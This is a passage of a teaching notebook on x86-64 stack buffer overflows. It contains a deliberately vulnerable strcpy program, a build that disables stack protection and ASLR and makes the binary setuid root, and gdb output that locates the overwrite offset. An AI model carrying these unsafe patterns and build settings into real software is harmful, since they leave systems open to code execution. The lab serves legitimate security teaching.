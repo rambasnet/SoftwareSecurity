{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d4fa2ff0",
   "metadata": {},
   "source": [
    "# Stack Overflow on 64-bit x86-64 Architecture\n",
    "\n",
    "- stack overflow on a 64-bit machine is similar to that on a 32-bit machine\n",
    "- there are some minor differences and challenges that we need to consider\n",
    "- significantly expands the number and size of the 32-bit architecture\n",
    "- x64bit registers are 64-bit (8 byte) wide\n",
    "- there are 16 general purpose registers prefix with R instead of E\n",
    "    - RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, R8, R9, R10, R11, R12, R13, R14, and R15\n",
    "- each of these 64-bit registers also has associated 32-bit (e.g., EAX), 16-bit (e.g., AX), and 8-bit (e.g., AL, AH) sub-registers, which can be accessed independently\n",
    "    - hence 64-bit architecture can run 32-bit programs\n",
    "- 1 Instruction Pointer - RIP\n",
    "- 1 Flags REgister (RFLAGS)\n",
    "- many other special-purpose registers (e.g., segment registers: code segment, stack segment, etc. floating point registers)\n",
    "\n",
    "\n",
    "## Stack Layout\n",
    "\n",
    "- the stack layout on a x64 architecture is similar to that on a x86 architecture\n",
    "- the major difference is how arguments are passed to functions\n",
    "- in x86, recall that all arguments are passed on the stack in reverse order\n",
    "- in x64, the first six arguments are passed in registers:\n",
    "    - `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`\n",
    "- if there are more than six arguments, the rest are passed on the stack\n",
    "- let's say we have a function `foo` that takes eight arguments:\n",
    "    - `int foo(int a, int b, int c, int d, int e, int f, int g, int h)`\n",
    "- the first six arguments are passed in registers:\n",
    "    - a -> `rdi`; b->`rsi`, c->`rdx`, d->`rcx`, e->`r8`, and f->`r9`\n",
    "- the last two arguments are passed on the stack:\n",
    "\n",
    "```\n",
    "lower address       |      ...          |\n",
    "    ↑               |  local var2       | <- rbp - 16\n",
    "    ↑               |  local var1       | <- rbp - 8\n",
    "    ↑               |  caller rbp       | <- rbp\n",
    "    ↑               |  return address   | <- rbp + 8\n",
    "    ↑               |  arg g            | <- rbp + 16\n",
    "    ↑               |  arg h            | <- rbp + 24\n",
    "higher address      |       ...         |\n",
    "```\n",
    "\n",
    "## Zeros in Address - A challenge\n",
    "\n",
    "- looking at the stack layout above, exploiting a x64 stack overflow is similar to that on a x86 machine\n",
    "- however, the return address is 8 bytes long\n",
    "- x64 only uses 48 bits of the 64-bit address space from `0x0000000000000000` to `0x00007FFFFFFFFFFF`\n",
    "- this means that the return address will always have at least TWO bytes of zeros in the most significant bits\n",
    "- having`\\x00s` in the payload can be a challenge, beacuse the `strcpy`, `cin` functions will stop copying when it encounters a null byte (`\\x00`)\n",
    "- note that gdb will not print the most significant (prefix) zeros, so you will see the address as `0x7FFFFFFFE3C0` instead of `0x00007FFFFFFFE3C0`\n",
    "- however, in little-endian, the address will be stored as `0xC0E3FF7FFFFF0000`\n",
    "- this means that the return address will have two null bytes at the end of the address\n",
    "- even if the `strcpy` function stops copying at the first null byte, the saved return address of the caller will still be overwritten with the correct address with the two null bytes currently at the end of the address\n",
    "- meaning we only need to copy the 6 bytes and the first 2 bytes are 0's and already available\n",
    "\n",
    "- let's say we want to overwrite `0x00007FFAAAAAAAAA` with `0x00007FFBBBBBBBBB`\n",
    "- stack before overflow\n",
    "```txt\n",
    "\n",
    "lower address   | ....             |\n",
    "                | ....             |\n",
    " return address | AAAAAAAAAFF70000 |\n",
    " \n",
    "highter address | ......           |\n",
    "\n",
    "```\n",
    "- stack after overflow\n",
    "```txt\n",
    "\n",
    "lower address   | ....             |\n",
    "                | ....             |\n",
    "return address  | BBBBBBBBBFF70000 |\n",
    " \n",
    "highter address | ......           |\n",
    "\n",
    "```\n",
    "\n",
    "\n",
    "## Example\n",
    "\n",
    "- let's compile `/demos/stack_overflow/x64/stack.cpp` with the Makefile in the same directory\n",
    "- Makefile compiles with all compiler protections disabled\n",
    "- it also disables ASLR and stack canaries\n",
    "- it compiles the program as setuid root, so that we can execute the program as root\n",
    "- must run Makefile with sudo privilege"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "d95df66d-3db2-4f2d-85da-09652b9bc0ff",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SoftwareSecurity/notebooks'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "4218f96e-a353-4771-a34e-8c778e8ba6b3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64\n"
     ]
    }
   ],
   "source": [
    "%cd ../demos/stack_overflow/x64/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "67bb205f-3d0b-4ed2-97f2-0e0d7b5b5e2a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/workspaces/SoftwareSecurity/demos/stack_overflow/x64'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4a86d3a1-9ca0-474b-a20c-dd5e2f2fb1ea",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Makefile      exploit.py   peda-session-stack.exe.txt  stack.exe\n",
      "bad.txt       good.txt\t   peda.gdb\t\t       stack_gdb\n",
      "commands.gdb  pattern.txt  stack.cpp\n"
     ]
    }
   ],
   "source": [
    "! ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "af6b3b2a-cd0b-413a-a4a5-5eea0e6dccb0",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdlib>\r\n",
      "#include <iostream>\r\n",
      "#include <cstring>\r\n",
      "#include <fstream>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "const int MAX_DATA = 200;\r\n",
      "\r\n",
      "void vulnerable(char *str) {\r\n",
      "\tchar buffer[100];\r\n",
      "\tstrcpy(buffer, str);\r\n",
      "\tcout << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tchar data[MAX_DATA];\r\n",
      "\t//file_name = strcpy(file_name, argv[1]\r\n",
      "\tFILE *fin;\r\n",
      "\tfin = fopen(argv[1], \"r\");\r\n",
      "\tfread(data, sizeof(char), MAX_DATA, fin);\r\n",
      "\tvulnerable(data);\r\n",
      "\tcout << \"All done...\" << endl;\r\n",
      "\treturn 0;\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat stack.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "27147f06-9b24-40c5-b065-aaae6bc0d619",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "g++ -g -Wall -std=c++17 -fno-stack-protector -z execstack -no-pie stack.cpp  -o stack.exe \n",
      "# must run make with sudo to disable randomaize_va_space\n",
      "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
      "tee: /proc/sys/kernel/randomize_va_space: Permission denied\n",
      "0\n",
      "make: *** [Makefile:24: build] Error 1\n"
     ]
    }
   ],
   "source": [
    "! make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "151d175f-e25d-4fb4-8256-2ad65bf6e1c6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: g++ -g -Wall -std=c++17 -fno-stack-protector -z execstack -no-pie stack.cpp  -o stack.exe \n",
      "# must run make with sudo to disable randomaize_va_space\n",
      "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
      "0\n",
      "sudo chown root:root stack.exe \n",
      "sudo chmod +s stack.exe  \n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "0f849a83",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 84\r\n",
      "drwxr-xr-x 2 kali kali  4096 Apr  4 14:47 .\r\n",
      "drwxr-xr-x 3 kali kali  4096 Apr  2 15:24 ..\r\n",
      "-rw-r--r-- 1 kali kali   128 Mar 31 14:20 badfile.bin\r\n",
      "-rw-r--r-- 1 kali kali   301 Mar 31 14:20 bad.txt\r\n",
      "-rw-r--r-- 1 kali kali   140 Mar 31 14:20 commands.gdb\r\n",
      "-rw-r--r-- 1 kali kali  1628 Apr  4 14:46 generate_payload.py\r\n",
      "-rw-r--r-- 1 kali kali    51 Mar 31 14:20 good.txt\r\n",
      "-rw-r--r-- 1 kali kali  1082 Mar 31 14:20 Makefile\r\n",
      "-rw-r--r-- 1 kali kali   500 Mar 31 14:20 pattern.txt\r\n",
      "-rw-r--r-- 1 kali kali    93 Mar 31 14:20 peda.gdb\r\n",
      "-rw-r--r-- 1 kali kali    18 Apr  4 14:47 peda-session-stack.exe.txt\r\n",
      "-rw-r--r-- 1 kali kali   489 Mar 31 14:20 stack.cpp\r\n",
      "-rwsr-sr-x 1 root root 32944 Apr  4 14:47 stack.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "5ba0e393",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set args good.txt\r\n",
      "break vulnerable\r\n",
      "run\r\n",
      "next\r\n",
      "print $rbp\r\n",
      "print &buffer\r\n",
      "print \"offset: \"\r\n",
      "print /d (void *)$rbp - (void *)&buffer\r\n",
      "continue\r\n",
      "quit\r\n"
     ]
    }
   ],
   "source": [
    "! cat commands.gdb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "16053e41-ab7b-4248-a02a-ed45f5fcb1b1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[35;1mGNU gdb (Debian 13.1-1) 13.1\u001b[m\n",
      "Copyright (C) 2023 Free Software Foundation, Inc.\n",
      "License GPLv3+: GNU GPL version 3 or later <\u001b[32mhttp://gnu.org/licenses/gpl.html\u001b[m>\n",
      "This is free software: you are free to change and redistribute it.\n",
      "There is NO WARRANTY, to the extent permitted by law.\n",
      "Type \"show copying\" and \"show warranty\" for details.\n",
      "This GDB was configured as \"x86_64-linux-gnu\".\n",
      "Type \"show configuration\" for configuration details.\n",
      "For bug reporting instructions, please see:\n",
      "\u001b[32m<https://www.gnu.org/software/gdb/bugs/>\u001b[m.\n",
      "Find the GDB manual and other documentation resources online at:\n",
      "    <\u001b[32mhttp://www.gnu.org/software/gdb/documentation/\u001b[m>.\n",
      "\n",
      "For help, type \"help\".\n",
      "Type \"apropos word\" to search for commands related to \"word\"...\n",
      "Reading symbols from \u001b[32m./stack.exe\u001b[m...\n",
      "Breakpoint 1 at \u001b[34m0x401172\u001b[m: file \u001b[32mstack.cpp\u001b[m, line 13.\n",
      "[Thread debugging using libthread_db enabled]\n",
      "Using host libthread_db library \"\u001b[32m/lib/x86_64-linux-gnu/libthread_db.so.1\u001b[m\".\n",
      "Warning: '\u001b[1mset logging off\u001b[m', an alias for the command '\u001b[1mset logging enabled\u001b[m', is deprecated.\n",
      "Use '\u001b[1mset logging enabled off\u001b[m'.\n",
      "\n",
      "Warning: '\u001b[1mset logging on\u001b[m', an alias for the command '\u001b[1mset logging enabled\u001b[m', is deprecated.\n",
      "Use '\u001b[1mset logging enabled on\u001b[m'.\n",
      "\n",
      "\u001b[2J\u001b[H\u001b[;34m[----------------------------------registers-----------------------------------]\u001b[0m\n",
      "\u001b[m\u001b[;32mRAX\u001b[0m: \u001b[;34m0x7fffffffc8e0\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
      "\u001b[;32mRBX\u001b[0m: \u001b[;34m0x7fffffffcac8\u001b[0m --> \u001b[;34m0x7fffffffd022\u001b[0m (\"/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe\")\n",
      "\u001b[;32mRCX\u001b[0m: 0xfbad2498 \n",
      "\u001b[;32mRDX\u001b[0m: 0x0 \n",
      "\u001b[;32mRSI\u001b[0m: \u001b[;34m0x417490\u001b[0m ('A' <repeats 50 times>, \"\\n\")\n",
      "\u001b[;32mRDI\u001b[0m: \u001b[;34m0x7fffffffc8e0\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
      "\u001b[;32mRBP\u001b[0m: \u001b[;34m0x7fffffffc8c0\u001b[0m --> \u001b[;34m0x7fffffffc9b0\u001b[0m --> 0x2 \n",
      "\u001b[;32mRSP\u001b[0m: \u001b[;34m0x7fffffffc840\u001b[0m --> \u001b[;31m0x7ffff7a94b40\u001b[0m (<flush_cleanup>:\tsub    rsp,0x8)\n",
      "\u001b[;32mRIP\u001b[0m: \u001b[;31m0x401172\u001b[0m (<_Z10vulnerablePc+12>:\tmov    rdx,QWORD PTR [rbp-0x78])\n",
      "\u001b[;32mR8 \u001b[0m: \u001b[;34m0x7ffff7bf1ac0\u001b[0m --> 0x0 \n",
      "\u001b[;32mR9 \u001b[0m: 0x4 \n",
      "\u001b[;32mR10\u001b[0m: 0x6 \n",
      "\u001b[;32mR11\u001b[0m: 0x246 \n",
      "\u001b[;32mR12\u001b[0m: 0x0 \n",
      "\u001b[;32mR13\u001b[0m: \u001b[;34m0x7fffffffcae0\u001b[0m --> \u001b[;34m0x7fffffffd073\u001b[0m (\"COLORFGBG=15;0\")\n",
      "\u001b[;32mR14\u001b[0m: \u001b[;34m0x7ffff7ffd000\u001b[0m --> \u001b[;34m0x7ffff7ffe2e0\u001b[0m --> 0x0 \n",
      "\u001b[;32mR15\u001b[0m: \u001b[;32m0x403de8\u001b[0m --> \u001b[;31m0x401130\u001b[0m (<__do_global_dtors_aux>:\tendbr64)\u001b[0m\n",
      "\u001b[m\u001b[;32mEFLAGS\u001b[0m: 0x203 (\u001b[;1;31mCARRY\u001b[0m \u001b[;32mparity\u001b[0m \u001b[;32madjust\u001b[0m \u001b[;32mzero\u001b[0m \u001b[;32msign\u001b[0m \u001b[;32mtrap\u001b[0m \u001b[;1;31mINTERRUPT\u001b[0m \u001b[;32mdirection\u001b[0m \u001b[;32moverflow\u001b[0m)\u001b[0m\n",
      "\u001b[m\u001b[;34m[-------------------------------------code-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m   0x401167 <_Z10vulnerablePc+1>:\u001b[;2m\tmov    rbp,rsp\u001b[0m\n",
      "   0x40116a <_Z10vulnerablePc+4>:\u001b[;2m\tadd    rsp,0xffffffffffffff80\u001b[0m\n",
      "   0x40116e <_Z10vulnerablePc+8>:\u001b[;2m\tmov    QWORD PTR [rbp-0x78],rdi\u001b[0m\n",
      "=> 0x401172 <_Z10vulnerablePc+12>:\u001b[;1;32m\tmov    rdx,QWORD PTR [rbp-0x78]\u001b[0m\n",
      "   0x401176 <_Z10vulnerablePc+16>:\u001b[m\tlea    rax,[rbp-0x70]\u001b[0m\n",
      "   0x40117a <_Z10vulnerablePc+20>:\u001b[m\tmov    rsi,rdx\u001b[0m\n",
      "   0x40117d <_Z10vulnerablePc+23>:\u001b[m\tmov    rdi,rax\u001b[0m\n",
      "   0x401180 <_Z10vulnerablePc+26>:\u001b[;1;4;31m\tcall   0x401030 <strcpy@plt>\u001b[0m\u001b[0m\n",
      "\u001b[m\u001b[;34m[------------------------------------stack-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m0000| \u001b[;34m0x7fffffffc840\u001b[0m --> \u001b[;31m0x7ffff7a94b40\u001b[0m (<flush_cleanup>:\tsub    rsp,0x8)\u001b[0m\n",
      "\u001b[m0008| \u001b[;34m0x7fffffffc848\u001b[0m --> \u001b[;34m0x7fffffffc8e0\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0016| \u001b[;34m0x7fffffffc850\u001b[0m --> 0xc8 \u001b[0m\n",
      "\u001b[m0024| \u001b[;34m0x7fffffffc858\u001b[0m --> 0x1 \u001b[0m\n",
      "\u001b[m0032| \u001b[;34m0x7fffffffc860\u001b[0m --> 0xc8 \u001b[0m\n",
      "\u001b[m0040| \u001b[;34m0x7fffffffc868\u001b[0m --> \u001b[;34m0x7fffffffc8e0\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0048| \u001b[;34m0x7fffffffc870\u001b[0m --> \u001b[;34m0x7ffff7e93540\u001b[0m (0x00007ffff7e93540)\u001b[0m\n",
      "\u001b[m0056| \u001b[;34m0x7fffffffc878\u001b[0m --> \u001b[;31m0x7ffff7a88159\u001b[0m (<__GI__IO_fread+137>:\ttest   BYTE PTR [rbx+0x1],0x80)\u001b[0m\n",
      "\u001b[;34m[------------------------------------------------------------------------------]\u001b[0m\n",
      "\u001b[mLegend: \u001b[;31mcode\u001b[0m, \u001b[;34mdata\u001b[0m, \u001b[;32mrodata\u001b[0m, value\u001b[0m\n",
      "\n",
      "Breakpoint 1, \u001b[33mvulnerable\u001b[m (\n",
      "    \u001b[36mstr\u001b[m=0x7fffffffc8e0 'A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
      "    at \u001b[32mstack.cpp\u001b[m:13\n",
      "13\t\t\u001b[01mstrcpy\u001b[m\u001b[31m(\u001b[mbuffer\u001b[31m,\u001b[m str\u001b[31m);\u001b[m\n",
      "\u001b[2J\u001b[H\u001b[;34m[----------------------------------registers-----------------------------------]\u001b[0m\n",
      "\u001b[m\u001b[;32mRAX\u001b[0m: \u001b[;34m0x7fffffffc850\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
      "\u001b[;32mRBX\u001b[0m: \u001b[;34m0x7fffffffcac8\u001b[0m --> \u001b[;34m0x7fffffffd022\u001b[0m (\"/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe\")\n",
      "\u001b[;32mRCX\u001b[0m: 0x16 \n",
      "\u001b[;32mRDX\u001b[0m: \u001b[;34m0x7fffffffc8e0\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
      "\u001b[;32mRSI\u001b[0m: \u001b[;34m0x7fffffffc8ff\u001b[0m ('A' <repeats 19 times>, \"\\n\\367\\377\\177\")\n",
      "\u001b[;32mRDI\u001b[0m: \u001b[;34m0x7fffffffc86f\u001b[0m ('A' <repeats 19 times>, \"\\n\\367\\377\\177\")\n",
      "\u001b[;32mRBP\u001b[0m: \u001b[;34m0x7fffffffc8c0\u001b[0m --> \u001b[;34m0x7fffffffc9b0\u001b[0m --> 0x2 \n",
      "\u001b[;32mRSP\u001b[0m: \u001b[;34m0x7fffffffc840\u001b[0m --> \u001b[;31m0x7ffff7a94b40\u001b[0m (<flush_cleanup>:\tsub    rsp,0x8)\n",
      "\u001b[;32mRIP\u001b[0m: \u001b[;31m0x401185\u001b[0m (<_Z10vulnerablePc+31>:\tlea    rax,[rbp-0x70])\n",
      "\u001b[;32mR8 \u001b[0m: \u001b[;34m0x7ffff7bf1ac0\u001b[0m --> 0x0 \n",
      "\u001b[;32mR9 \u001b[0m: 0x4 \n",
      "\u001b[;32mR10\u001b[0m: 0x6 \n",
      "\u001b[;32mR11\u001b[0m: \u001b[;31m0x7ffff7b71990\u001b[0m (<__strcpy_avx2>:\tvpxor  xmm7,xmm7,xmm7)\n",
      "\u001b[;32mR12\u001b[0m: 0x0 \n",
      "\u001b[;32mR13\u001b[0m: \u001b[;34m0x7fffffffcae0\u001b[0m --> \u001b[;34m0x7fffffffd073\u001b[0m (\"COLORFGBG=15;0\")\n",
      "\u001b[;32mR14\u001b[0m: \u001b[;34m0x7ffff7ffd000\u001b[0m --> \u001b[;34m0x7ffff7ffe2e0\u001b[0m --> 0x0 \n",
      "\u001b[;32mR15\u001b[0m: \u001b[;32m0x403de8\u001b[0m --> \u001b[;31m0x401130\u001b[0m (<__do_global_dtors_aux>:\tendbr64)\u001b[0m\n",
      "\u001b[m\u001b[;32mEFLAGS\u001b[0m: 0x202 (\u001b[;32mcarry\u001b[0m \u001b[;32mparity\u001b[0m \u001b[;32madjust\u001b[0m \u001b[;32mzero\u001b[0m \u001b[;32msign\u001b[0m \u001b[;32mtrap\u001b[0m \u001b[;1;31mINTERRUPT\u001b[0m \u001b[;32mdirection\u001b[0m \u001b[;32moverflow\u001b[0m)\u001b[0m\n",
      "\u001b[m\u001b[;34m[-------------------------------------code-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m   0x40117a <_Z10vulnerablePc+20>:\u001b[;2m\tmov    rsi,rdx\u001b[0m\n",
      "   0x40117d <_Z10vulnerablePc+23>:\u001b[;2m\tmov    rdi,rax\u001b[0m\n",
      "   0x401180 <_Z10vulnerablePc+26>:\u001b[;2;31m\tcall   0x401030 <strcpy@plt>\u001b[0m\n",
      "=> 0x401185 <_Z10vulnerablePc+31>:\u001b[;1;32m\tlea    rax,[rbp-0x70]\u001b[0m\n",
      "   0x401189 <_Z10vulnerablePc+35>:\u001b[m\tmov    rsi,rax\u001b[0m\n",
      "   0x40118c <_Z10vulnerablePc+38>:\u001b[m\tlea    rax,[rip+0x2ead]        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>\u001b[0m\n",
      "   0x401193 <_Z10vulnerablePc+45>:\u001b[m\tmov    rdi,rax\u001b[0m\n",
      "   0x401196 <_Z10vulnerablePc+48>:\u001b[;32m\tcall   0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>\u001b[0m\u001b[0m\n",
      "\u001b[m\u001b[;34m[------------------------------------stack-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m0000| \u001b[;34m0x7fffffffc840\u001b[0m --> \u001b[;31m0x7ffff7a94b40\u001b[0m (<flush_cleanup>:\tsub    rsp,0x8)\u001b[0m\n",
      "\u001b[m0008| \u001b[;34m0x7fffffffc848\u001b[0m --> \u001b[;34m0x7fffffffc8e0\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0016| \u001b[;34m0x7fffffffc850\u001b[0m ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0024| \u001b[;34m0x7fffffffc858\u001b[0m ('A' <repeats 42 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0032| \u001b[;34m0x7fffffffc860\u001b[0m ('A' <repeats 34 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0040| \u001b[;34m0x7fffffffc868\u001b[0m ('A' <repeats 26 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0048| \u001b[;34m0x7fffffffc870\u001b[0m ('A' <repeats 18 times>, \"\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[m0056| \u001b[;34m0x7fffffffc878\u001b[0m (\"AAAAAAAAAA\\n\\367\\377\\177\")\u001b[0m\n",
      "\u001b[;34m[------------------------------------------------------------------------------]\u001b[0m\n",
      "\u001b[mLegend: \u001b[;31mcode\u001b[0m, \u001b[;34mdata\u001b[0m, \u001b[;32mrodata\u001b[0m, value\u001b[0m\n",
      "14\t\tcout \u001b[31m<<\u001b[m buffer \u001b[31m<<\u001b[m endl\u001b[31m;\u001b[m\n",
      "$1 = (void *\u001b[36m\u001b[m) \u001b[34m0x7fffffffc8c0\u001b[m\n",
      "$2 = (char (*\u001b[36m\u001b[m)[100]) \u001b[34m0x7fffffffc850\u001b[m\n",
      "$3 = \"offset: \"\n",
      "$4 = 112\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
      "��\n",
      "All done...\n",
      "[Inferior 1 (process 529180) exited normally]\n",
      "\u001b[m\u001b[;33mWarning: not running\u001b[0m\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "# running commands.gdb script\n",
    "! gdb -x commands.gdb ./stack.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "567d6add",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[35;1m\u001b[35;1mGNU gdb \u001b[m\u001b[35;1m(Ubuntu 9.2-0ubuntu1~20.04.2) \u001b[m\u001b[35;1m9.2\u001b[m\u001b[35;1m\n",
      "\u001b[m\u001b[mCopyright (C) 2020 Free Software Foundation, Inc.\n",
      "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n",
      "This is free software: you are free to change and redistribute it.\n",
      "There is NO WARRANTY, to the extent permitted by law.\n",
      "Type \"show copying\" and \"show warranty\" for details.\n",
      "This GDB was configured as \"x86_64-linux-gnu\".\n",
      "Type \"show configuration\" for configuration details.\n",
      "For bug reporting instructions, please see:\n",
      "<http://www.gnu.org/software/gdb/bugs/>.\n",
      "Find the GDB manual and other documentation resources online at:\n",
      "    <http://www.gnu.org/software/gdb/documentation/>.\n",
      "\n",
      "For help, type \"help\".\n",
      "Type \"apropos word\" to search for commands related to \"word\"...\n",
      "Reading symbols from \u001b[32m./stack.exe\u001b[m...\n",
      "\u001b[mWriting pattern of 500 chars to filename \"pattern.txt\"\u001b[0m\n",
      "Breakpoint 1 at \u001b[34m0x4011f6\u001b[m: file \u001b[32mstack.cpp\u001b[m, line 11.\n",
      "\u001b[;34m[----------------------------------registers-----------------------------------]\u001b[0m\n",
      "\u001b[m\u001b[;32mRAX\u001b[0m: \u001b[;34m0x7fffffffd090\u001b[0m (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
      "\u001b[;32mRBX\u001b[0m: \u001b[;31m0x401350\u001b[0m (<__libc_csu_init>:\tendbr64)\n",
      "\u001b[;32mRCX\u001b[0m: \u001b[;31m0x7ffff7cf61f2\u001b[0m (<__GI___libc_read+18>:\tcmp    rax,0xfffffffffffff000)\n",
      "\u001b[;32mRDX\u001b[0m: 0x0 \n",
      "\u001b[;32mRSI\u001b[0m: \u001b[;34m0x417090\u001b[0m (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
      "\u001b[;32mRDI\u001b[0m: \u001b[;34m0x7fffffffd090\u001b[0m (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
      "\u001b[;32mRBP\u001b[0m: \u001b[;34m0x7fffffffd160\u001b[0m --> 0x0 \n",
      "\u001b[;32mRSP\u001b[0m: \u001b[;34m0x7fffffffd078\u001b[0m --> \u001b[;31m0x4012b0\u001b[0m (<main(int, char**)+108>:\t)\n",
      "\u001b[;32mRIP\u001b[0m: \u001b[;31m0x4011f6\u001b[0m (<vulnerable(char*)>:\tendbr64)\n",
      "\u001b[;32mR8 \u001b[0m: 0xc8 \n",
      "\u001b[;32mR9 \u001b[0m: 0x7c ('|')\n",
      "\u001b[;32mR10\u001b[0m: 0xfffffffffffff613 \n",
      "\u001b[;32mR11\u001b[0m: 0x246 \n",
      "\u001b[;32mR12\u001b[0m: \u001b[;31m0x401110\u001b[0m (<_start>:\tendbr64)\n",
      "\u001b[;32mR13\u001b[0m: \u001b[;34m0x7fffffffd250\u001b[0m --> 0x2 \n",
      "\u001b[;32mR14\u001b[0m: 0x0 \n",
      "\u001b[;32mR15\u001b[0m: 0x0\u001b[0m\n",
      "\u001b[m\u001b[;32mEFLAGS\u001b[0m: 0x206 (\u001b[;32mcarry\u001b[0m \u001b[;1;31mPARITY\u001b[0m \u001b[;32madjust\u001b[0m \u001b[;32mzero\u001b[0m \u001b[;32msign\u001b[0m \u001b[;32mtrap\u001b[0m \u001b[;1;31mINTERRUPT\u001b[0m \u001b[;32mdirection\u001b[0m \u001b[;32moverflow\u001b[0m)\u001b[0m\n",
      "\u001b[m\u001b[;34m[-------------------------------------code-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m   0x4011ec <__do_global_dtors_aux+44>:\u001b[;2m\tnop    DWORD PTR [rax+0x0]\u001b[0m\n",
      "   0x4011f0 <frame_dummy>:\u001b[;2m\tendbr64 \u001b[0m\n",
      "   0x4011f4 <frame_dummy+4>:\u001b[;2;33m\tjmp    0x401180 <register_tm_clones>\u001b[0m\n",
      "=> 0x4011f6 <vulnerable(char*)>:\u001b[;1;32m\tendbr64 \u001b[0m\n",
      "   0x4011fa <vulnerable(char*)+4>:\u001b[m\tpush   rbp\u001b[0m\n",
